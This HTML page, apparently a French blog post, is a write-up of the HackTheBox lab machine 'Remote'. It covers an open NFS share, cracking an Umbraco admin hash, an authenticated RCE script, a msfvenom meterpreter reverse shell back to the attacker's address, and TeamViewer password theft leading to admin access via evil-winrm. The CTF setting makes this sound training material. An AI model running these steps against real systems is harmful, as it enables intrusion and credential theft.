@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Remote :: RedFou52 - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello et bienvenue sur mon write-up de la machine remote sur HackTheBox !
+C&amp;rsquo;est ma première machine Windows, j&amp;rsquo;ai fait quelques erreurs mais bon, on est là pour apprendre non ? :)
+ Tools  Kali linux 2020 &#43; Tous les outils Shell : ZSH VirtualBox pour Kali-linux   NMAP Le classique, un nmap pour voir les ports ouverts sur la machine.
+FTP Il y a un port FTP avec un accès ANONYMOUS mais celui-ci ne retourne rien d&amp;rsquo;interessant."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/writeup/remote/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Remote"/>
+<meta name="twitter:description" content="HackTheBox : Remote"/>
+
+
+
+<meta property="og:title" content="Remote" />
+<meta property="og:description" content="HackTheBox : Remote" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeup/remote/" />
+<meta property="article:published_time" content="2020-08-02T11:28:50+02:00" />
+<meta property="article:modified_time" content="2020-08-02T11:28:50+02:00" /><meta property="og:site_name" content="RedFou52 - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">RedFou52 - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/raspberry">Raspberry</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/raspberry">Raspberry</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/writeup/remote/">Remote</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          02-08-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par Eidorian</span>
+      
+        <span class="post-read-time">— 4 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/writeup/remote/htb-remote.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+      <p><img src="/img/fr/writeup/remote/remote.png" alt="remote">
+Hello et bienvenue sur mon write-up de la machine remote sur HackTheBox !</p>
+<p>C&rsquo;est ma première machine Windows, j&rsquo;ai fait quelques erreurs mais bon, on est là pour apprendre non ? :)</p>
+<hr>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>Kali linux 2020 + Tous les outils</li>
+<li>Shell : ZSH</li>
+<li>VirtualBox pour Kali-linux</li>
+</ul>
+<hr>
+<h2 id="nmap">NMAP</h2>
+<p>Le classique, un nmap pour voir les ports ouverts sur la machine.</p>
+<p><img src="/img/fr/writeup/remote/nmap.png" alt="nmap"></p>
+<p><img src="/img/fr/writeup/remote/nmap_2.png" alt="nmap_2"></p>
+<h2 id="ftp">FTP</h2>
+<p>Il y a un port FTP avec un accès ANONYMOUS mais celui-ci ne retourne rien d&rsquo;interessant.</p>
+<p><img src="/img/fr/writeup/remote/ftp.png" alt="ftp"></p>
+<h2 id="web-site">Web Site</h2>
+<p>Pour le site web, il sagit d&rsquo;un CMS Umbraco.<br>
+La page de login se trouve ic :</p>
+<ul>
+<li><code>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</code></li>
+</ul>
+<h2 id="cve">CVE</h2>
+<p>On va regarder les CVE avec ce CMS.</p>
+<p><img src="/img/fr/writeup/remote/searchploit_umbraco.png" alt="searchploit"></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">~ ヤマト» msfconsole 
+msf5 &gt; search 19671
+msf5 &gt; use exploit/windows/http/umbraco_upload_aspx
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; set RHOSTS 10.10.10.180
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; set LHOST 10.10.14.30
+msf5 exploit(windows/http/umbraco_upload_aspx) &gt; show options
+</code></pre><p><img src="/img/fr/writeup/remote/umbraco_msf.png" alt="msf"></p>
+<p>Mais l&rsquo;exploit ne fonctionne pas.</p>
+<h2 id="nfs">NFS</h2>
+<p>Après avoir fouillé le site web sans rien trouvé, j&rsquo;ai remarqué que sur le NMAP il y avait un port 111 avec un protocol NFS.</p>
+<p>Si les droits sont mal géré sur ce partage, il est possible de le monter sur notre Linux.</p>
+<ul>
+<li><a href="https://docs.datafabric.hpe.com/51/DevelopmentGuide/c-mount-nfs-on-linux.html">https://docs.datafabric.hpe.com/51/DevelopmentGuide/c-mount-nfs-on-linux.html</a></li>
+</ul>
+<p>Et c&rsquo;est le cas :</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">sudo apt-get install nfs-common (Ubuntu)
+~ ヤマト» sudo showmount -e 10.10.10.180
+Export list for 10.10.10.180:
+/site_backups (everyone)
+</code></pre><p>Il y a un dossier <code>/site_backups</code> accéssible à tout le monde.<br>
+Il suffit de le monter.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">HTB/remote ヤマト» mkdir site_backups
+HTB/remote ヤマト» sudo mount -o hard,nolock 10.10.10.180:/site_backups site_backups 
+</code></pre><p><img src="/img/fr/writeup/remote/backup.png" alt="backup"></p>
+<p>On cherchant des info sur Umbraco, j&rsquo;ai vu qu&rsquo;il existait un fichier umbraco.sdf qui sert de &ldquo;database&rdquo; et peut contenir des choses interesssantes.</p>
+<p><code>site_backups/App_Data ヤマト» strings Umbraco.sdf | grep password</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;smith&quot; &lt;smith@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;ssmith&quot; &lt;ssmith@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+User &quot;admin&quot; &lt;admin@htb.local&gt;192.168.195.1User &quot;admin&quot; &lt;admin@htb.local&gt;umbraco/user/password/changepassword change
+</code></pre><p>Il y a l&rsquo;air d&rsquo;y avoir 3 utilisateurs :</p>
+<ul>
+<li>Admin</li>
+<li>smith</li>
+<li>ssmith</li>
+</ul>
+<p>EN faisant un grep sur admin on tombe sur un hash en SHA1.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+</code></pre><p>On va essayé de le craquer.
+PS : Les deux autres utilisateurs on un hash en SHA256.</p>
+<p>Admin hash : <code>b8be16afba8c314ad33d812f22a04991b90e2aaa</code></p>
+<p>Utilisons hash-identifier pour être sûr.</p>
+<p><img src="/img/fr/writeup/remote/hash-identifier.png" alt="hash-identifier"></p>
+<p>Pour cracker le hash : <a href="https://sha1.gromweb.com/?hash=b8be16afba8c314ad33d812f22a04991b90e2aaa">https://sha1.gromweb.com/?hash=b8be16afba8c314ad33d812f22a04991b90e2aaa</a></p>
+<p>Le mot de passe est : <code>baconandcheese</code></p>
+<p>La connexion <strong>FTP</strong> ne fonctionne pas avec ce mot de passe.</p>
+<h2 id="connexion">Connexion</h2>
+<p>Pour se connecter au site web, pensez à utiliser l&rsquo;identifiant <strong><a href="mailto:admin@htb.local">admin@htb.local</a></strong> car juste <strong>admin</strong> ne fonctionnera pas !</p>
+<p>Login : <code>admin@htb.local</code>
+Passwd: <code>baconandcheese</code></p>
+<h2 id="exploit-umbraco">Exploit UMBRACO</h2>
+<p>J&rsquo;ai trouvé un exploit pour <strong>umbraco</strong>.<br>
+<a href="https://github.com/noraj/Umbraco-RCE">https://github.com/noraj/Umbraco-RCE</a></p>
+<p><img src="/img/fr/writeup/remote/python3-exploit.png" alt="python"></p>
+<p>Cet exploit permet d&rsquo;executer des commandes <code>CMD</code> à distance avec un compte.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">remote/Umbraco-RCE [master] ヤマト» python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'whoami'
+iis apppool\defaultapppool
+</code></pre><p>De cette manière nous allons faire executer un payload afin d&rsquo;avoir accès à un SHELL.</p>
+<p>Premièrement, création du payload.<br>
+<code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=4444 -f exe &gt; yamato.exe</code></p>
+<p>Ensuite, handler avec msf.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">msfconsole
+msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) &gt; set lhost 10.10.14.30
+exploit
+</code></pre><p>Pour finir, il faut trouver un moyen d&rsquo;upload notre payload.exe sur la machine.</p>
+<p>Ca tombe bien, avec umbraco il y a moyen d&rsquo;upload des fichiers depuis le dashboard.</p>
+<p><img src="/img/fr/writeup/remote/upload_1.png" alt="upload_1"></p>
+<p><img src="/img/fr/writeup/remote/upload_2.png" alt="upload_2"></p>
+<p>Au passage, il y a la possibilité de prendre le flag user avec notre exploit python.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">remote/Umbraco-RCE [master] ヤマト» python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'type C:/Users/Public/user.txt'
+26e814bae68ca8afa3a413759dcfdfc0
+</code></pre><p>Maintenant il faut que je trouve /media/1033/yamato.exe pour l&rsquo;executer avec notre exploit python.</p>
+<p>Notre <strong>exe</strong> se trouve dans <code>C:/inetpub/wwwroot/media/1033/yamato.exe</code></p>
+<p><img src="/img/fr/writeup/remote/python3-exploit_2.png" alt="python-2"></p>
+<p>Maintenant, il faut l&rsquo;executer avec le script python.</p>
+<p>Voila !</p>
+<p><img src="/img/fr/writeup/remote/msf_exploit.png" alt="msf"></p>
+<h2 id="road-to-root">Road to ROOT</h2>
+<p>Maintenant que nous avons un accès USER assez stable, il faut trouver un moyen d&rsquo;avoir un accès ROOT.</p>
+<p>Premièrement, je vais regarder les Programmes installés sur la machine.</p>
+<p><img src="/img/fr/writeup/remote/dir.png" alt="dir"></p>
+<p>On peut voir qu&rsquo;il y a TeamViewer d&rsquo;installer sur la machine, en version 7.</p>
+<p>C&rsquo;est le moment de trouver un exploit !
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md</a></p>
+<p>Cet exploit va nous permetre de récupérer le mot de passe administrateur utilisé avec TeamViewer.</p>
+<p><img src="/img/fr/writeup/remote/teamviewer.png" alt="teamviewer"></p>
+<p>Bingo !</p>
+<p>login : <code>Administrator</code>
+pass : <code>!R3m0te!</code></p>
+<p>Maintenant, il nous faut un accès distant avec un compte administrateur.</p>
+<p>Pour ca, rien de plus simple, on va utiliser l&rsquo;outil <strong>evil-winrm</strong>.</p>
+<p><a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+<p><code>HTB/remote ヤマト» sudo evil-winrm -u Administrator -p '!R3m0te!' -i 10.10.10.180</code></p>
+<p>RE:Bingo on a notre accès ROOT il reste plus qu&rsquo;a récupérer le flag !
+<code>C:/Users/Administrator/Desktop/root.txt</code></p>
+<p>flag:<code>e6637b36871bed4041ce7fa150c22b68</code></p>
+<p>Voila, c&rsquo;était ma première machine sous Windows !</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@RedFou52 - Eidorian - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
